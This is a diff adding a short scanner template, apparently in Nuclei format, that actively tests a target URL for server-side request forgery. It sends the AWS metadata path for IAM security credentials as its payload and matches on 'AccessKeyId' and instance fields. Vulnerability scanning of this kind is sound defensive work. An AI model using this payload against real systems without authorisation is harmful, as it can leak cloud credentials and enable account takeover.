@@ -1,0 +1,22 @@
+id: patt-ssrf-cloud-aws-01-fetch
+name: 'PATT ssrf patt-ssrf-cloud-aws-01 via fetch'
+severity: high
+type: active
+tags:
+  - ssrf
+  - patt
+  - cloudaws
+description: 'PATT AWS IAM creds path. [patt:patt-ssrf-cloud-aws-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/SSRF-Cloud-Instances.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      fetch:
+        - 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'ami-id'
+          - 'instance-id'
+          - 'AccessKeyId'
